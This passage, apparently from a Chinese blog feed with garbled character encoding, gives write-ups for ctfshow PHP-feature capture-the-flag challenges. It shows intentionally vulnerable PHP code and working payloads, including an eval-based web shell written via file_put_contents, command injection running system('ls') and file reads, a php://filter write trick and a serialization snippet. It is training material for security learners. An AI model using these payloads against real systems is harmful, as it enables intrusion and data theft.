        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è§£ç å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/5ffb75187dbc42149eb9443b38b8d876.png" alt="2"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPç‰¹æ€§</title>
    <url>/2023/04/07/PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//ä¸è®©å‡ºç°å­—æ¯ã€a-zã€‘å’Œç‚¹ã€.ã€‘ã€‚</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//æŸ¥çœ‹æ•°å­—ä¸­æ˜¯å¦æœ‰0å‡ºç°ï¼Œç”±äºå¼€å¤´çš„é›¶ä¼šçœ‹æˆå…«è¿›åˆ¶è§£æã€‚</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>phpçš„intvalå‡½æ•°é»˜è®¤å€¼è½¬æ¢æ˜¯åè¿›åˆ¶ï¼Œå½“æ•°å­—ä»¥0å¼€å¤´æ—¶ä»¥å…«è¿›åˆ¶è½¬æ¢ï¼Œä»¥0xå¼€å¤´æ—¶ä»¥åå…­è¿›åˆ¶è½¬æ¢ã€‚<br>è¿™ä¸ªé¢˜ä¸­å¯ä»¥ä½¿ç”¨å…«è¿›åˆ¶ï¼ˆ0å¼€å¤´ï¼‰ç»•è¿‡,åå…­è¿›åˆ¶ä¸è¡Œï¼ˆ0xå¼€å¤´ï¼‰ã€‚4476è½¬æ¢ä¸ºå…«è¿›åˆ¶ä¸º10574ã€‚phpä¸­+å¯ä»¥å½“ä½œç©ºæ ¼ä½¿ç”¨ã€‚<br>?num&#x3D;+010574</p>
<h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">
Notice: Undefined index: flag in /var/www/html/index.php on line 15

Notice: Undefined index: flag in /var/www/html/index.php on line 16

Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 21:39:27
# @link: https://ctfer.com

*/</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//å¦‚æœå­˜åœ¨getæ–¹æ³•ä¼ å…¥å‚æ•°ï¼Œå°±å°†getä¼ å…¥å‚æ•°å˜ä¸ºpostæ–¹æ³•ä¼ å…¥å‚æ•°ã€‚</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//è‹¥get(flag)ä¼ å…¥çš„flagï¼Œcookieå˜ä¸ºâ€œflagâ€ã€‚</span>
<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//è‹¥get(flag)ä¼ å…¥çš„flagï¼ŒSERVERå˜ä¸ºâ€œflagâ€ã€‚</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get(HTTP_FLAG)ä¼ å…¥flagï¼Œå¾—åˆ°flag.php</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ok,getä¼ å…¥éšä¾¿ä¼ å‚<code>?1=3</code>postä¼ å…¥<code>HTTP_FLAG=flag</code>ã€‚å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/162ebf1159144b3c94f25788a35441d6.png" alt="1"></p>
<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-18 22:36:12
# @link: https://ctfer.com

*/</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®¾ç½®ä¸ºæ•°ç»„</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//0x36d=877</span>
    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†æ•°ç»„å†™å…¥$allowï¼ˆéšæœºæ•°ï¼‰</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//åŒ¹é…ä¼ å…¥çš„nå€¼æ˜¯å¦åœ¨$allowä¸­ï¼Œå­˜åœ¨è¿”å›true</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†postä¼ å‚ï¼ˆcontentï¼‰å†™å…¥æ–‡ä»¶</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payloadï¼š<code>?n=1.php</code>in_arrayå­˜åœ¨å¼±æ¯”è¾ƒæ¼æ´ï¼Œä¼ å…¥1.phpä¼šåˆ¤æ–­ä¸º1ã€‚<br>postï¼š<code>content=&lt;? eval($_POST[a]);?&gt;</code>ï¼Œä¸è¡Œçš„è¯å¤šè¯•å‡ æ¬¡ï¼Œæ¯•ç«Ÿæ˜¯éšæœºåŒ¹é…ã€‚</p>
<h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag in class ctfshow;</span>
<span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹<strong>é€»è¾‘è¿ç®—ç¬¦</strong>ï¼Œå†å¤ä¹ ä¸€ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/61e22c6d589646a29eedcc378991996f.png" alt="2"><br><strong>æ³•ä¸€</strong><br>payload<code>?v1=1&amp;v2=system(&quot;ls&quot;)/*&amp;v3=;*/;</code><br><code>?v1=1&amp;v2=system(&quot;cat ctfshow*&quot;)/*&amp;v3=;*/;</code>å³é”®æŸ¥çœ‹æºç <br><strong>æ³•äºŒ</strong><br>é‡‡ç”¨<strong>phpçš„åå°„ç±»ReflectionClass</strong><br><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br><img src="https://img-blog.csdnimg.cn/61af74a693254f7aa8822b5d01eb4015.png" alt="1"><br>è®°å¾—æŠŠ0x2dæ”¹æˆ<code>-</code>ï¼Œæœ€åå†åŠ ä¸Šctfshow{}ã€‚</p>
<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>call_user_func</code>æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œå®ƒå…è®¸ä½ é€šè¿‡å‡½æ•°åå­—ç¬¦ä¸²è°ƒç”¨ä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•ã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨call_user_funcè°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„ä¾‹å­ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token comment">// è¾“å‡º 5</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨call_user_funcé€šè¿‡å‡½æ•°åå­—ç¬¦ä¸²â€™addâ€™æ¥è°ƒç”¨addå‡½æ•°ï¼Œå¹¶ä¼ é€’äº†å‚æ•°2å’Œ3ã€‚<strong>call_user_func</strong>æ‰§è¡Œäº†add(2, 3)ï¼Œè¿”å›ç»“æœ5ã€‚</p>
<p>é™¤äº†å‡½æ•°åå­—ç¬¦ä¸²ä¹‹å¤–ï¼Œ$callbackè¿˜å¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«å¯¹è±¡å’Œæ–¹æ³•åçš„æ•°ç»„ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªé—­åŒ…ã€‚<strong>call_user_func</strong>åœ¨ä½¿ç”¨è¿™äº›ç±»å‹çš„å›è°ƒæ—¶ä¸ä½¿ç”¨å‡½æ•°åå­—ç¬¦ä¸²çš„æ–¹å¼æ˜¯ç±»ä¼¼çš„ã€‚<br><code>hex2bin() å‡½æ•°</code>æŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦<br><code>bin2hex()å‡½æ•°</code>æŠŠASCII å­—ç¬¦è½¬æ¢ä¸º åå…­è¿›åˆ¶å€¼<br>æœ¬é¢˜ä¸­ä¼ å…¥çš„v1ä¸$såœ¨å‡½æ•°<code>call_user_func</code>ä¸­ä¼šè°ƒç”¨$s<br>v2è¦çº¯æ•°å­—v3ä¸é™</p>
<blockquote>
<p><strong>GET</strong><br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br><strong>POST</strong><br>v1&#x3D;hex2bin<br>#è®¿é—®2.phpåæŸ¥çœ‹æºä»£ç è·å¾—flag</p>
</blockquote>
<p><a href="https://blog.csdn.net/m0_62094846/article/details/122497198">å‚è€ƒé“¾æ¥</a></p>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span>
<span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>foreachå‡½æ•°</code></p>
<blockquote>
<p>foreach å¾ªç¯åªé€‚ç”¨äºæ•°ç»„ï¼Œå¹¶ç”¨äºéå†æ•°ç»„ä¸­çš„æ¯ä¸ªé”®&#x2F;å€¼å¯¹ã€‚<br><code>foreach ($array as $value)</code></p>
</blockquote>
<blockquote>
<p><code>die() å‡½æ•°</code>è¾“å‡ºä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶é€€å‡ºå½“å‰è„šæœ¬ã€‚</p>
</blockquote>
